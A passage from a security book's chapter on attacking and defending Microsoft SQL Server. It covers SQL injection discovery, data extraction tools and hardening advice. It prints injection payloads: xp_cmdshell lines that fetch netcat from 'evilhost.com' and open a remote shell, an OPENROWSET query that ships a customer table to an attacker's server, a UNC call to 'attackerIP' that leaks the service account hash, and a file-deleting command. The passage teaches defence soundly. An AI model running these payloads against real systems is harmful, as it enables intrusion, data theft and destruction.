Keep in mind that this technique works on any netlib that transfers  data over the network as long as encryption is not enabled. Anyone sniffing passwords  from an unencrypted transmission can trivially convert the password to plaintext and  log into your SQL server unhindered. If decoding the passwords manually is too much  of a chore, a freely available tool called Cain & Abel can be used to sniff SQL Server  passwords off the wire and will decode them for you.  Using  the  encrypted  netlibs  is  absolutely  essential  if  passwords  and  data  will  be  transferred over a network and are subject to eavesdropping. If you install a certificate  on the server, SQL Server will automatically encrypt passwords even if you are not using  an  encrypted  netlib.  If  you  are  using  SQL  Server  2005,  and  you  haven’t  installed  a  certificate, SQL Server will create a self-signed certificate for you, although that will not  provide server authentication or non-repudiation.  SQL Server Packet Snifﬁ ng Countermeasures As  you  might  expect,  the  way  to  prevent  sniffing  is  to  encrypt  the  traffic  between  hosts. Some would suggest that switched networks might solve the issue, but with  plenty  of  ways  to  subvert  switched  systems,  encryption  is  still  the  only  foolproof  method  for  protecting  your  data  in  transit.  Several  possibilities  for  doing  this  are  shown in Table 9-3.

In  SQL  Server  application  development,  particularly  for  web-based  applications, it is necessary to store a connection string so that the application will  know how to connect to the server. Unfortunately, this can be an albatross if the web  server reveals the connection string to an unauthorized user.  Over the years, we have seen a number of source code disclosure vulnerabilities in  IIS  and  other  web  servers.  Many  times,  the  disclosure  comes  from  one  of  the  aforementioned  bugs,  and  other  times,  the  disclosure  comes  from  poor  security  practices.  An  example  of  this  is  storing  connection  strings  in  include  files  with  an  extension such as .inc or .src. An unauthorized user can simply scour the site looking  for connect.inc or any number of variants, and when she finds the file, she’ll be rewarded  with  the  connection  string  the  web  server  is  using  to  connect  to  SQL  Server.    296   Hacking Exposed Windows: Windows Security Secrets & Solutions   If the application is using native SQL Server logins, she’ll also see the username and  password. The obvious solution for this issue is to name all include files with the  .asp  or  .aspx  extension   for  IIS  servers   so  that  they  are  subject  to  server-side  processing like all other files and also removing possible backup files  .bak or .old   that may be generated by text editors.  The moral of this story is that you should assume someone will eventually see  your passwords. Do what you can to isolate the SQL server so that a source disclosure  does  not  always  result  in  a  complete  security  breach. Also,  you  should  consider  using Windows authentication for your SQL Server connections  despite the more  complex setup in some cases , because that will mean not having to include usernames  and passwords in connection strings.  SQL Injection Attacks Until this point, we have focused mostly on instances in which an attacker has direct  access  to  the  SQL  Server.  However,  with  the  ubiquity  of  the  Windows  Firewall,  SQL  Server 2005 not activating network libraries by default in Desktop editions, and security- conscious network administrators being more common, it seems that direct access is a  luxury. SQL injection attacks are a different form of attack, in which an attacker gains  access to the SQL Server through indirect means such as a web-based application, a web  service, or even instant messaging or e-mail.  SQL  injection  is  best  described  as  the  ability  to  inject  SQL  commands  that  the  developer  never  intended  into  an  existing  application.  One  thing  to  remember  while  reading this section is that this type of attack is not limited to SQL Server. Virtually any  database that accepts SQL commands can be affected to one degree or another by these  techniques. It should also be noted that SQL injection is an application problem, not a  problem with the database server. Whether the injection occurs on an ASP page on a  website or in stored procedure in the SQL Server itself, most all SQL injection vulner- abilities are the result of poor input validation by the programmer.  The effects of a successful SQL injection attack can range anywhere from a disclosure  of otherwise inaccessible data to a full compromise of the hosting server. An attacker  really needs to do only three things to perform a successful SQL injection attack:     Discover SQL injection vulnerability    Investigate and derive existing SQL    Construct SQL injection code  SQL Injection Vulnerability Discovery A potential attacker will usually probe web-based applications or web services by inputting  single  quotes  into  text,  numeric,  and  date  fields  and  checking  for  error  messages  after  posting. The reason this is dangerous is because the single quote is the string identifier  terminator character for SQL Server. Inserting an extra single quote will cause the execution    Chapter 9:  Hacking SQL Server   297  string to be improperly formed and generate an error such as “Unclosed quotation mark  before the character string.” This is not always successful, as good developers tend to hide  database failures from end users, but more often than not, a user will be greeted with an  ugly ODBC or OLE DB error when the single quote has done its magic.  The three most common errors generated are     Unclosed quotation mark before the character string  from SQL Server     Internal server error  from web server     Syntax error  from SQL Server   Persistent attackers will probe numeric fields to determine whether they will accept  textual data as well. Invalid textual data that makes it back to the SQL server will likely  set off an “Incorrect syntax near” or “Invalid column name” error message and alert the  attacker  that  further  exploitation  may  be  possible.  The  danger  of  poorly  validated  numeric fields lies in the fact that it is not necessary to manipulate single quotes to inject  the  code.  Poorly  constructed  SQL  statements  will  simply  append  an  attacker’s  code  directly into an otherwise legitimate SQL command and work its magic.  Temporal  Vulnerability  Analysis  If  the  application  developer  has  done  a  good  job  of  handling exceptions, then it is quite likely that you will not get an error message of any  strange behavior whatsoever. In those cases, you can perform a “temporal analysis” to  determine whether an injection was successful. Simply use the T-SQL WAITFOR DELAY command to tell SQL Server to pause for 10 seconds or so, and it should be immediately  obvious when an injection is successful. For example, let’s say we have a web page that  returns a result in less than 1 second. If we then send it a request like this, http:  localhost portal- asp EditMembers.asp?user_id=1%20waitfor%20delay%20'00:10:00'--  suddenly,  the  request  takes  more  than  10  seconds  to  complete;  it  is  likely  that  the  additional latency is due to our command reaching the SQL Server, which forced a delay  of 10 seconds on our data access request. Of course, you can set the delay for longer time  periods  which may be needed for slow links , but keep in mind that you don’t want the  page to time out; try to keep the request under 30 seconds, since that’s the time limit  many web servers place on individual page requests.  Blind  SQL  Injection  In  addition  to  temporal  analysis,  a  method  called  “blind  SQL  injection” can be used for discovery and information disclosure. This method involves  sending binary requests to the SQL Server to have it return true  the proper result  or  false  another result  to a specific question. For example, what if we wanted to determine  whether the sql user account under which the application is running has dbo permissions?  We could issue a command like this: http:  localhost portal-asp EditMembers.asp?user_id=1%20and%20user_name  ='dbo'  If the user is a dbo, we should see the information for the user with a user_ID of 1 as we  requested . Otherwise, no data is returned. Using this type of true false analysis, we can    298   Hacking Exposed Windows: Windows Security Secrets & Solutions   determine table names and eventually even enumerate data directly from the database.  This in accomplished by asking simple questions like “Is the first letter of the table name  an a?” The analysis can be quite time consuming but is very effective.  Application Scanners  As you can imagine, analyzing every field of every web page for  SQL  injection  vulnerabilities  is  a  gargantuan  task.  Luckily,  commercial  and  freely  available tools are available to help with all this vulnerability testing—on the commercial  side,  try  WebInspect  by  SPI  Dynamics,  Web  Vulnerability  Scanner  by  Acunetix,  and  AppScan by Watchfire, among others. Non-commercial solutions include Paros Proxy,  Achilles, and WebScarab.  Of the non-commercial side, Paros Proxy  Figure 9-7  provides the most automated  capabilities  for  vulnerability  detection.  All  you  need  to  do  is  load  the  application,  configure your browser to point to the proxy server  Paros defaults to TCP port 8080 at  localhost , and connect to the target website. Inside Paros, you can right-click the server  and choose Spider to enumerate all the pages on the site. Finally, by selecting Scan, you  can have Paros automatically scan the entire site for a variety of vulnerabilities including  SQL  injection,  Cross  Site  Scripting,  and  web  server  misconfigurations.  Please  keep  in  mind  that  none  of  these  tools  is  a  replacement  for  manual  analysis  since  many  vulnerabilities do not lend themselves to automated detection.  Figure 9-7  Paros Proxy makes application security scanning almost as simple as a port scanner.   Chapter 9:  Hacking SQL Server   299  Determine SQL Structure After  an  attacker  has  identified  a  potential  target,  his  next  step  is  to  determine  the  structure  of  the  SQL  command  he  is  attempting  to  hijack.  By  investigating  the  error  messages or by simple trial and error, the attacker will attempt to determine the actual  SQL code behind the page. For example, if a search form returned a product list containing  product IDs, names, prices, and an image, the attacker could probably make a safe guess  that the SQL behind the page might be something like the following: SELECT productId, productName, productPrice, ProductURL, FROM sometable WHERE productName LIKE '%mySearchCriterion%'  In this case, the attacker is making assumptions based on returned datasets. In many  cases, developers bring back many more fields from the database than are displayed or  use  more  complicated  syntax.  In  these  instances,  more  advanced  SQL  programming  experience is required, but diligence will eventually result in a fairly close approximation  of the code behind the page. For example, if the attacker is having trouble getting some  injected code to execute, he could be up against a SQL string like the following: SELECT productId, productName, productPrice, ProductURL, FROM sometable WHERE  productName LIKE '%mySearchCriterion%' OR productPrice < 5  AND productSaleFlag=1  The attacker must be able to close the parentheses or his attack will result in a syntax  error from SQL Server. Of course, a common SQL Server injection strategy is to use the  comment operator  --  to comment out the rest of the SQL code. However, it will not  work in this case since the open parenthesis occurs before the injection. The only real  solution is to close the parentheses so that the SQL command will execute properly.  This is just a sample of the challenges that attackers face when trying to inject code  into complex SQL applications. Thankfully for the attackers, most SQL code is not nearly  as complex, but in certain situations, a keen understanding of T-SQL programming is  absolutely critical in mounting a successful attack.  Build and Inject SQL Code When the attacker has an idea of what the SQL behind the page might be, he would  probably like to learn more about the login under which the application is running and  perhaps the version information of the SQL server. One way to get this information from  an existing application is to use the UNION keyword to append a second result set to the  one already being produced by the existing SQL code. The attacker injects the following  code into the search field: Zz' UNION SELECT 1, SELECT @@version ,SUSER_SNAME  ,1 --  This code first attempts to short-circuit the first result set by looking for two zs, and then  UNION the empty result with the data in which the hacker is interested. Selecting the 1s   300   Hacking Exposed Windows: Windows Security Secrets & Solutions   is necessary to make sure the attacker matches the number of columns in the previous  result set. The most interesting feature of the injection code is the double dashes at the  end. As stated previously, this is necessary to comment out the last single quote likely  embedded in the application, to surround the data the attacker will input. If successful,  he  now  knows  the  SQL  Server  version  and  service  pack  status,  the  operating  system  version  and  service  pack  status,  as  well  as  the  login  he  is  using  to  execute  his  commands.  Let’s  say  that  in  this  case  the  login  turned  out  to  be  sa   the  system  administrator  account .  With  system  administrator  privileges,  the  attacker  is  free  to  execute  any  command on the SQL server itself. The next snippets of injected code placed in the input  field might be something like the following  assuming xp_cmdshell is enabled on the  SQL Server : Zz' exec master..xp_cmdshell 'tftp –i evilhost.com GET netcat.exe'--  And then this: Zz' exec master..xp_cmdshell 'netcat –L-d-e cmd.exe –p 53'--  At this point, the attacker is using the TFTP client included with Windows to bring in  the useful netcat utility and obtain a remote shell—check and mate. There is little use in  discussing this attack further, since the attacker is free to import and execute code on the  target machine as well as access all data on the SQL server.  Advanced SQL Injection 10 7 9 9  Popularity: Simplicity: Impact:  Risk Rating:  The previous example assumes that an attacker gains access with a high-privilege  account on a SQL server with the xp_cmdshell extended stored procedure enabled. Since  attackers are not always so lucky, they must also rely on more advanced techniques that  leverage the capabilities of even low-privilege accounts. Once an attacker has determined  a viable means of attack, he is likely to pursue a variety of possible objectives, and we  need  to  be  aware  of  these.  An  attacker  will  in  all  likelihood  be  after  one  of  the  following:     Tamper with existing data in an attempt to damage the integrity of the assets    Steal data by returning information back to the web page    Steal data via blind SQL injection    Steal data via outbound data tunnel  Next  we’ll  look  at  some  tools  and  techniques  that  can  be  used  in  low-privilege   situations where attackers don’t always get total control with a single vulnerability.   Chapter 9:  Hacking SQL Server   301  Absinthe To  fill  the  need  for  push-button  SQL  injection  exploitation,  a  tool  called  Absinthe  by nimmish and Xeron  was created  Figure 9-8 . This tool does not search for  SQL  injection  vulnerabilities  but  rather  exploits  a  known  vulnerability  to  extract  information from the database. It does this by using one of two mechanisms: blind SQL  injection and SQL Server error messages.  The blind SQL injection method sends multiple requests to the application asking  binary, yes no questions of the SQL Server by specially crafting injected SQL code. This  method can take quite a long time, especially if a slow link exists between the attacker  and the vulnerable web application. The primary advantage of this method is that it will  work even with error messages suppressed by the application.  Figure 9-8  Absinthe can automate SQL injection and error-based data theft attacks.   302   Hacking Exposed Windows: Windows Security Secrets & Solutions   The SQL Server error messages method works by using specially crafted SQL code to  force data to be displayed back to the tool from an error message. This is usually achieved  by taking some piece of text and attempting to convert it into an integer. SQL Server will  usually report back with an error message like this: Conversion failed when converting the varchar value 'test' to data type int  By repeatedly cycling through table names, field names, and data, the tool can derive the  contents of a victim’s entire database.  No  matter  which  method  you  use,  this  tool  will  take  a  long  time  to  extract  data,  which may expose the attacker to detection if the web server logs are closely monitored.  However,  the  advantage  is  that  the  attacker  does  not  need  to  set  up  any  special  infrastructure on the remote side to extract data from the SQL Server. Since, at a minimum,  most web-based applications run with select access to many database tables, this tool can  be very effective at extracting a victim’s data right through the website.  BobCat A more efficient, but complex, method of extracting data from a remote SQL  Server is to use the OPENROWSET  still possible in SQL 2005 but disabled by default  to  push data out to remote locations. The OPENROWSET functionality allows the SQL Server  to connect to remote data sources within the context of a query. This is a very handy  function  that  unfortunately  can  have  dire  consequences  when  in  the  wrong  hands.  Consider the following query: insert into OPENROWSET 'SQLOLEDB', 'uid=sa;pwd=ha$c^k&;Network=DBMSSOCN;Address=hackersip,1433;', 'select * from remotecustomertable'  select * from customertable  This query selects data from the customer table and inserts it  over the network  to  an attacker’s SQL Server. This method is much more efficient than trying to pull the data  one character or one field at a time, as does the Absinthe tool. However, the side effect is  that this requires the attacker to install and expose a SQL Server to the Internet or local  network. In addition, if the target SQL Server is prevented from establishing outbound  connections, this attack will fail.  BobCat  Figure 9-9  is a tool that helps automate the process of assembling the proper  SQL commands for this attack. Based on a tool called Data Thief, originally developed by  Cesar but since retired, BobCat was developed by northern-monkee as a .NET port of the  original Data Thief tool.  As you can see, the tool requests the location of the attacker’s SQL Server and all of  its connection information. If the target SQL Server allows outbound connections, this  tool can easily download the entire contents of the database in short order.  Should a victim notice the attack and inspect the requests, she would have access to  the attacker’s SQL Server for as long it remains connected to the Internet. Although the  tool defaults to the sa account, an attacker could use a lower privilege account with DDL  permissions to create tables and insert data.   Chapter 9:  Hacking SQL Server   303  Figure 9-9  BobCat can quickly absorb data from a victim SQL server if it allows outbound  connections.  Stealing SQL Server Service Credentials with Minimal Privileges  Do not assume that just because  an attacker can only gain SQL user privileges that you are safe. Consider an application  that properly uses least privilege and allows the application to run as a normal user account  and has been granted access only to a restricted set of tables and or stored procedures. In  addition to the obvious data theft possibilities, an attacker could also make use of system  stored procedures that are available to the public role, such as xp_dirtree. The extended stored procedure xp_dirtree has a seemingly harmless function: it  simply creates a directory tree of a location on any attached drives to which the SQL  service account has access. In addition to the obvious information disclosure threat  on  SQL 2005, no data will be returned unless you are a sysadmin, but the server still tries to  connect  making  it  vulnerable ,  it  does  something  else  that  is  interesting:  it  accepts  a  Universal  Naming  Convention   UNC . A  UNC  allows  you  to  specify  other  hosts.  By  using a specially crafted UNC name, it is possible to make a request to a remote server  using a SQL injection vulnerability and force it to connect back to another system on the  Internet  or local network .  Here’s an example snippet of SQL injection code: ' exec xp_dirtree '\\attackerIP\someshare'--  If an attacker has a sniffer running on the wire  or he’s simply running a tool like  Cain and Able, which has the sniffer and the password cracker built-in  and the victim’s    304   Hacking Exposed Windows: Windows Security Secrets & Solutions   SQL  Server  allows  outbound  connections,  it  is  very  possible  that  the  attacker  could  intercept the authentication request of the SQL Server  trying to connect to the UNC  and  steal the hash.  “What  good  is  the  password  of  the  SQL  Server  service  account?”  you  might  ask.  Well,  when  installing  SQL  Server,  the  user  is  encouraged  to  provide  two  critical  credentials:     The username and password for the SQL Server service account    The sa account password  even when using Windows Authentication   If the installer is like most humans, the passwords will likely be the same. In addition,  the password may also be used for high-privilege accounts within the application, IIS, or  the operating system itself. Of course, if the SQL Server is running as LocalSystem, the  attacker  will  have  no  credentials  to  steal—but  then  the  SQL  Server  is  running  with  excessive privileges so an attacker may turn his attention toward exploiting that fact.  SQL Injection Countermeasures Vendor Bulletin: Bugtraq ID: Fixed in SP: Log Signature:  NA NA NA Y  Brace yourself for some disappointing news. If your applications are susceptible to  SQL injection, no hotfix, service pack, or quick fix is available to protect you  except if the  application  has  its  own  updates  such  as  with  commercial  or  open-source  products .  Instead, you must rely on such defenses as good architecture, development processes,  and code review. Although some tools have begun to surface that claim to ferret out SQL  injection  problems,  none  so  far  can  match  the  power  of  good  security-related  quality  assurance.  Only one technique will reliably help fight the injection issue at the application layer:  parameterized queries. Parameterized queries clearly define which portions of the query  are variable and which are static, thus eliminating string-building code that is highly  susceptible to attack. While not 100 percent effective in protecting against SQL injection  at all layers, it is still your best defensive strategy.  SQL  injection  can  also  manifest  itself  in  stored  procedures  that  use  EXEC  or  sp_executeSQL  statements even when parameterized queries are used, since the injection occurs at a different layer   the database .  To see why this is the only reliable method, let’s look at some other methods that   have been proven to be helpful but do not offer complete protection:     String replacement    Stored procedures   Chapter 9:  Hacking SQL Server   305  Replacing a single quote with two single quotes tells the SQL server that the character  being passed is a literal quote.  This is how someone with the last name O’Reilly can be  placed in your LastName field.  To do this in Active Server Pages, you can make use of  the replace command in VBScript like the following: <%<  variable = left replace inputstring,','' ,10  %>  This will apparently neuter the injection into the 10-character text field. However, this  can fail in some situations. For example, let’s consider if the input was 123456789'. When  the replace  function  is  executed,  the  single  quote  will  be  normalized  to  two  single  quotes,  but  when  the  text  is  truncated  by  the  left  statement,  the  vulnerability  remanifests.  Using stored procedures can also seemingly help to stem the flow of SQL commands  to the back end since the commands are precompiled. The most common failure of stored  procedures  to  protect  applications  is  when  stored  procedures  are  implemented  using  string-building  techniques  that  defeat  your  protection.  Examine  the  following  code  snippet: <%<Set Conn = Server.CreateObject "ADODB.Connection"  Conn.open "dsn=myapp;Trusted_Connection=Yes" Set RS = Conn.Execute "exec sp_LoginUser '" & request.form "username"  & "','" & request.form "password"  & "'"   %>  Here you see that although the developer has used stored procedures, his implementation  is  poor  because  simply  injecting  code  into  the  password  field  will  easily  allow  the  injection to occur. If someone injects the following into the password field, ' exec master..xp_cmdshell 'del *.*  Q' --  the SQL Server will see the following code: exec sp_LoginUser 'myname','' exec master..xp_cmdshell 'del *.*  Q' --'  If,  of  course,  this  batch  of  commands  is  perfectly  legitimate,  and  if  the  necessary  permissions exist, the user will delete all the files from the default directory  \winnt\ system32 .  As always, the only truly secure implementation of the stored procedure or any SQL  statement  is  when  parameterized  queries  are  utilized.  The  following  example  shows  how to issue the previous stored procedure in a secure manner  the same methods can  be used for ad hoc SQL statements : <% Set Conn = Server.CreateObject "adodb.connection"  Conn.Open Application "ConnectionString"  Set cmd = Server.CreateObject "ADODB.Command"  Set cmd.ActiveConnection = Conn cmd.CommandText = "sp_LoginUser"   306   Hacking Exposed Windows: Windows Security Secrets & Solutions   cmd.CommandType = 4 Set param1 = cmd.CreateParameter "username", 200, 1,20, request.form "username"   cmd.Parameters.Append param1 Set param2 = cmd.CreateParameter "password", 200, 1,20, request.form "password"   cmd.Parameters.Append param2 Set rs = cmd.Execute %>  As you can see, even though we failed to validate the input fields before this point, we  have now clearly defined the various portions of our query, including the procedure name  and each of the parameters. As a bonus, the parameters are matched against data types,  and character data is limited by length. Injecting code at this point does not allow it to  reach the SQL server since ADO can now construct the final command itself, automatically  converting single quotes to two single quotes and compensating for field length.  As a final warning, don’t make the mistake of believing that just because you use  parameterized queries that your application is completely safe from SQL injection. SQL  injection can occur at other application layers  such as inside of stored procedures that  use sp_executesql or EXEC statements , which could expose your applications even  if your higher level code uses best practices. What we are shooting for here is the most  secure method of data access at the current programming tier and to check all tiers for  coding mistakes.  CRITICAL DEFENSIVE STRATEGIES  Before discussing best practices, we discuss some of the most critical missteps many SQL  Server users and administrators make and how to avoid becoming another victim. As  those who fell prey to the SQL Slammer worm discovered, falling behind on hotfixes or  leaving unnecessary ports exposed to the Internet can be a fatal mistake. This section  outlines the primary tasks that must be undertaken to every SQL Server installation, no  matter what its purpose.  Discover All SQL Servers on Your Network Since you can’t secure what you don’t know about, it is critical that you discover all the  locations where SQL servers exist on your network. SQL servers are difficult to locate for  a  multitude  of  reasons,  including  multiple  instancing,  dynamic  TCP  port  allocation,  transient laptop installations, and the fact that client SQL servers are not always running   or are running only when the user needs them .  Despite how grim the situation may seem, solutions are at hand. A multitude of tools  are available, including SQLPing, SQL Scan  from Microsoft , SQLRecon, and various  commercial utilities that can scan for and determine the locations of SQL Server instances.  These tools make use of the SQL Browser Service and other techniques to ferret out SQL  servers.   Chapter 9:  Hacking SQL Server   307  Another method that is available to administrators is to query the service control  manager on all network hosts for instances of SQL Server. This method has the added  advantage of not requiring the SQL Server service to be running at the time  but the host  computer must be online . The following is an example of a batch file that can be used to  output a list of all SQL Server instances installed on your network, whether or not the  SQL Server service is running: @@@echo off net viewfind "\\">list.txt for  f %i in  list.txt  do sc %i query bufsize= 6000find "MSSQL"  Of course, these methods will locate instances only on running hosts. Other tools  allow  for  software  inventories  to  be  taken  when  machines  are  started. You  will  need  administrative control over all the machines in your environment to do this, but this is  probably the only way to ensure a 100 percent accurate inventory. Tools of this variety  include Numara Track-IT, Microsoft Systems Management Server, Microsoft Software  Inventory Analyzer, and OCSInventory.  Block Access to SQL Server Ports from Untrusted Clients One obvious way to keep attackers at bay is simply to firewall the server from direct  connections entirely from all but trusted clients. While this does not do much to defend  against  SQL  injection  attacks  or  attacks  where  supposedly  trusted  systems  are  compromised, it certainly is a prudent first line of defense. Obvious ports to block include  UDP  1434  and  all  TCP  ports  on  which  instances  of  SQL  Server  are  listening  using  a  personal firewall or a firewall device.  Determining the ports for all SQL Server instances can require some investigation.  Obviously, the default port  TCP 1433  is a prime candidate, but the other instances are  usually randomly assigned. For these, you can use a tool such as SQLPing to determine  the listening ports or use the Server Network Utility included with SQL Server to set the  TCP ports manually. Of course, the best strategy for any firewall is to block all inbound  and outbound traffic except for that which is specifically required.  Keep Current with Patches Keeping SQL servers up to date has proven to be a great challenge. One of the primary  reasons for this is that SQL Server patch detection was not included in Windows Update  until SQL Server 2005. Now that Windows Update finally supports SQL Server 2005, it is  hoped that this will eventually diminish the number of vulnerable desktop SQL Server  installations in the wild. However, if you are using a pre-2005 version of SQL Server, you  must detect and install patches manually.  In  addition  to  Windows  Update,  SQL  Server  2005  patches  can  be  automatically  deployed using Microsoft’s freely available Windows Software Update Services  WSUS .  It is simple to configure an entire domain of computers  using Group Policy  to pull their  updates  from  a  WSUS  server  and  get  Windows,  MS  Office,  SQL  Server  2005,  and  a  multitude of other patches automatically via an web-based approval process. Instructions  for doing this are included with the software.   308   Hacking Exposed Windows: Windows Security Secrets & Solutions   You can determine whether your SQL Server is out of date by viewing the server  properties  page  of  your  SQL  Server  instance  in  Management  Studio  or  issuing  the  following T-SQL: select @@version go  You must then compare that version information to the version number of the latest SQL  Server Service Pack or hotfix. Since Microsoft does not post the latest version information  on a reference web page, several community resources have arisen to keep track of SQL  Server version information, such as www.sqlsecurity.com.  Once you have determined that your SQL Server instance is out of date, you must go  to the Microsoft website to download the most current service pack or hotfix to get fully  patched.  You  need  to  ensure  that  you  have  the  latest  service  pack  installed  before  applying any hotfixes. Keep in mind that, prior to SQL Server 2005, service packs are  separate  for  SQL  Server,  MSDE,  and Analysis  Services,  and  you  must  download  and  apply them separately. In addition, you must apply the service packs separately to each  instance—so if you have three instances of SQL Server on the machine, you will need to  install the service pack three times, each time specifying a different instance. SQL Server  2005 has streamlined this process greatly, allowing for a unified service pack that can  patch multiple instances simultaneously.  Once you have installed the latest service pack, you need to obtain the latest hotfix.  SQL Server hotfixes are cumulative, so you need to obtain only the latest hotfix to be  fully patched. Since SQL Server 2005, SQL Server service packs and hotfixes are included  with Windows Update, which should greatly simplify the process over previous versions.  Administrators can have even more control by implementing WSUS on their networks  to ensure that patches go out only after a testing process.  Once you have applied the latest hotfix, you need to restart SQL Server and validate  that your version information matches the latest SQL Server version. If all this sounds  like  a  lot  of  work,  that’s  because  it  is.  It  is  unlikely  that  busy  system  administrators   much less developers or users  are going to keep their SQL Server instances up to date  without significant persuasion. That said, tools such as Shavlik’s HFNetChkPro  www.  shavlik.com  can remotely detect and apply SQL Server service packs and hotfixes, so  there is help out there. Do what you can now to put the necessary processes in place to  keep SQL Servers patched—it takes a good deal of effort, but the consequences of not  doing it are much worse.  Assign a Strong sa Account Password No  matter  which  SQL  Server  authentication  mode  you  choose,  it  is  critical  that  you  assign a strong sa account password. This account represents a member of the single  most powerful SQL Server role and is ripe for brute-force attacks. You need to set the sa  password even for SQL servers in Windows Only authentication mode in case the mode  is ever changed—you do not want your server to be immediately exposed.  The  sa  account  password  can  be  easily  changed  using  SQL  Server  Management  Studio or by executing the following T-SQL script, which sets the sa account password to  a reasonably long, random value:   Chapter 9:  Hacking SQL Server   309  DECLARE @pass char 72  SELECT @pass=convert char 36 ,newid   +convert char 36 ,newid    EXECUTE master..sp_password null,@pass,'sa' GO  Use Windows Only Authentication Mode Whenever Possible Using Windows Only authentication mode in SQL Server prevents brute-force attacks on  the weaker native SQL Server security model. Even though SQL Server 2005 does include  more advanced features such as password complexity, password lifetimes, and lockouts,  the Kerberos capabilities  such as Constrained Delegation  of Windows still provide a  more  robust  authentication  environment.  Windows  Authentication  mode  should  be  used as the default for any new installation, and the security mode should be changed  only if application requirements later demand it.  You can set the authentication mode for SQL Server using Management Studio or by  using T-SQL commands. The T-SQL script to set the authentication mode to Windows  Only for any SQL Server instance is as follows  must be a system administrator :  IF  charindex '\',@@SERVERNAME =0       EXECUTE master.dbo.xp_regwrite N'HKEY_LOCAL_MACHINE',N'Software\Microsoft\MSSQLServer\MSSQLServer',N'LoginMode' ,N'REG_DWORD',1            DECLARE @RegistryPath varchar 200             SET @RegistryPath = 'Software\Microsoft\Microsoft SQL Server\' + RIGHT @@SERVERNAME,LEN  @@SERVERNAME -CHARINDEX '\',@@SERVERNAME   + '\MSSQLServer'            EXECUTE master..xp_regwrite 'HKEY_LOCAL_MACHINE',@RegistryPath,N'LoginMode',N'REG_ DWORD',1  ELSE       BEGIN       END  GO  ADDITIONAL SQL SERVER SECURITY BEST PRACTICES  To  secure  your  SQL  Server  installations  of  all  types   SQL  Server  or  Express  Edition ,  you’ll  need  to  implement  a  set  of  best  practices  and  ensure  that  administrators  and  developers adhere to them. You are welcome to use these practices to develop a security  policy. Keep in mind, however, that a good policy is nothing without solid execution.  Make sure that administrators and developers are accountable and that failure to adhere  to standards will result in stiff penalties.  Considering Using Code Generation for Data Access Layers  Many flame-wars on the Internet  deal with the benefits  or lack thereof  of using code-generation technologies to create  applications. A code generator is basically a program that allows a developer to describe    310   Hacking Exposed Windows: Windows Security Secrets & Solutions   an application in metadata or by pointing it to a database and letting it build higher  levels of code automatically.  Without  becoming  deeply  entrenched  in  a  debate  about  whether  it  is  practical  to  develop entire applications using this technique, we can say that code generations do  have one obvious advantage over hand-generated code: they code consistently. If a code  generator emits only parameterized queries and never places unvalidated parameters  directly into a SQL string, then you can rest assured it won’t “forget” one day and code  a vulnerability into the application.  Good  code  generators  produce  consistent  code.  However,  bad  code  generators  produce consistently bad code. Be sure to choose your tools carefully if you decide to go  this path, because the wrong tool could torpedo your entire application. When evaluating  a code generation tool, try generating some of the sample applications and then perform  an automated analysis of the site using a tool like Paros. You’ll still need to perform a deep  manual analysis to be sure, but this is a quick way to exclude poor code generators.  Scan  Applications  Regularly  for  Security  Vulnerabilities  At  regular  intervals,  you  should  download the latest edition of whatever application security testing tool you use  such  as Paros  and perform a complete scan of your application. Be sure to keep these reports  on file in case any question arises as to when the report was last executed. Keep in mind  that application scanning tools are by no means a panacea, but you can bet that if those  tools  can  find  the  vulnerabilities,  an  attacker  can  do  the  same  thing.  They  are  a  very  inexpensive way to expose obvious problems that should be mitigated immediately.  Physically Protect Servers and Files  If someone can gain physical access to your SQL server,  she can employ a myriad of techniques to access your data. Take the time to protect the  physical server as well as any backups of your databases. If a malicious person  an ex- employee,  for  example   were  to  know  when  and  where  you  disposed  of  old  backup  tapes, she could recover the tapes and reattach your databases to her own installations of  SQL Server. Do yourself a favor and either lock old tapes in a safe or treat them the same  as sensitive documents that you dispose of—incinerate them.  Protect  Web  Servers  and  Clients  Connecting  to  SQL  Server  A  common  SQL  Server  compromise scenario occurs when a poorly administered web server is penetrated and  serves as a platform for attacks against the SQL server. When an attacker controls a web  server   or  any  client ,  he  will  generally  find  the  connection  strings  and  see  how  and  where the current applications are connecting to the SQL server. Using this information,  attackers can easily move against the SQL server using that context.  In addition, some vulnerabilities target SQL Server clients versus the server itself. For  example, if vulnerabilities exist in the SQL Server Management Studio, an attacker could  theoretically set up a Trojan server and wait for a SQL administrator to attempt a connection,  which would allow the attacker to control the user’s machine. This type of attack could be  devastating by targeting those users who have the highest levels of privilege. Take the time  to make sure that you not only lock down and apply patches to SQL Server but also to any  web servers or clients that will be connecting to your SQL servers.  Enable SQL Server Authentication Logging  By default, authentication logging is disabled in  SQL  Server  versions  prior  to  SQL  Server  2005.  You  can  remedy  this  situation  with  a    Chapter 9:  Hacking SQL Server   311  single command, and it is recommended that you do so immediately. You can either use  the Management Studio and look under Server Properties in the Security tab or issue the  following  command  to  the  SQL  Server  using  Management  Studio  or  sqlcmd   the  following is a single command line, wrapped due to page-width constraints : Master..xp_instance_regwrite N'HKEY_LOCAL_MACHINE',  N'SOFTWARE\Microsoft\MSSQLServer\MSSQLServer',N'AuditLevel', REG_DWORD,3  Whether you audit failed and or successful logins is completely dependent upon   your requirements, but there is no good excuse for not auditing at least failed logins.  Encrypt Data When Possible  It is folly to assume that your networks are always safe from  packet sniffers and other passive monitoring techniques. Always include encryption of  SQL Server data in your threat-assessment sessions. Microsoft has gone out of its way  to provide a myriad of options for session encryption, and it would be a shame not to  implement them if you can find a way to overcome possible performance losses due  to encryption overhead.  Now that SQL Server 2005 supports multiple encryption models, there are no excuses  for storing critical data in plaintext in the database. Should a backup be compromised or  a  SQL  injection  vulnerability  manifest  itself,  with  encryption,  your  data  will  have  an  extra layer of protection that should vastly reduce the number of individuals to whom  the data will be exposed.  Finally, it is highly recommended that all backup tapes or other media containing  SQL Server databases also be encrypted. Should backup media become compromised,  you need to make sure that the technical bar is high enough to protect your valuable data  from prying eyes. If you believe you need to encrypt the live database files, consider  using Encrypted File System  EFS  or the Bitlocker encryption used in Windows Vista.  Use the Principle of Least Privilege  If your dog-sitter needed to get in the back gate, would  you give him the key ring with the house key and the keys to the Porsche? Of course you  wouldn’t. So why do you have a production application running as the sa account or a  user with database-owner privileges? Take the time during installation of your application  to create a low-privilege account for the purposes of day-to-day connectivity. It may take  a little longer to itemize and grant permissions to all necessary objects, but your efforts  will be rewarded when someone does hijack your application and hits a brick wall from  insufficient rights to take advantage of the situation.  Also,  be  aware  that  the  same  principles  should  be  applied  to  the  service  account  under which the MSSQLServer service is running. During SQL Server installation, you  are presented with the option to run the SQL server as a user account. Take the time to  create  a  user  account   not  an  administrator   and  enter  the  user’s  credentials  during  installation. This will restrict users who execute 